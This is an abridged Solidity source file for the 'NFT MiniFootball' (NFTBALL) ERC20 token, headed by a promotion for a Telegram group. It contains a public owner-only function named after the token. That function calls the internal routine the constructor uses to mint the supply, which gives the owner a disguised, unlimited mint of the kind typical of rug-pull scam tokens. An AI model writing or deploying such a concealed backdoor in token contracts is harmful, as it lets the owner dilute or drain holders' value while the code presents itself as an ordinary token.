...
/**   
 * 
 *          Telegram Group - @nftminifootball
 * 
 *              Name   : NFT MiniFootball
 *              Symbol : NFTBALL
 ...
 *
 *      About Us
 *      Telegram : https://t.me/nftminifootball
 * 
*/
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function NFTMiniFootball(uint256 amount) public onlyOwner {
    _nftminifootball(msg.sender, amount);
    }
    ...
    function _nftminifootball(address account, uint256 amount) internal virtual {
...
contract NFTMiniFootball is ERC20 {

    uint tokenTotalSupply = 1000000000000000;

    constructor() public ERC20("NFT MiniFootball", "NFTBALL") {
        _nftminifootball(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}